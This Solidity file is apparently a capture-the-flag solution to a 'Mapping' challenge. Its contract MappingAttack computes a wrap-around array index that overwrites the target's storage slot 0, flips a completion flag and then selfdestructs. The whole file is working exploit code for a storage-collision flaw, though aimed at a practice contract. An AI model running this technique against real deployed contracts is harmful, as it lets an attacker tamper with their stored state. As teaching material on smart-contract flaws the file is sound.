///SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface MappingChallenge {
    function set(uint256 key, uint256 value) external;
}

contract MappingAttack {
    constructor(address mappingContractAddress) {
        uint256 arraySlotInStorage = 1;
        bytes32 arrayStartLocationInStorage = keccak256(
            abi.encodePacked(arraySlotInStorage)
        );

        uint256 boolSlotInStoragRelativeToArrayStartLocation = (
            type(uint256).max - uint256(arrayStartLocationInStorage) + 1);

        MappingChallenge(mappingContractAddress).set(
            boolSlotInStoragRelativeToArrayStartLocation,
            1
        );
        // for the gas refund $$$
        selfdestruct(payable(msg.sender));
    }
}
